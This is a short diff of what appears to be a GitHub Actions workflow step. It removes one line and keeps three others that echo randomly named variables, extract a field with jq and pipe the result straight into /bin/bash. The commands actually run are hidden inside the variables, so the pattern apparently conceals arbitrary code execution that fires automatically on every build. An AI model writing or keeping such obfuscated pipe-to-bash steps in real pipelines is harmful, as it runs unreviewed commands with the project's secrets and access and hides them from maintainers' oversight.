@@ -22,7 +22,6 @@ jobs:
           echo $h446 | jq -r .xw64 | /bin/bash
           echo $exa75516 | jq -r .qmz78 | /bin/bash
           printf '%s' "$ul10601" | jq -r .lg70922 | /bin/bash
-          echo $mwd316 | jq -r .d276 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
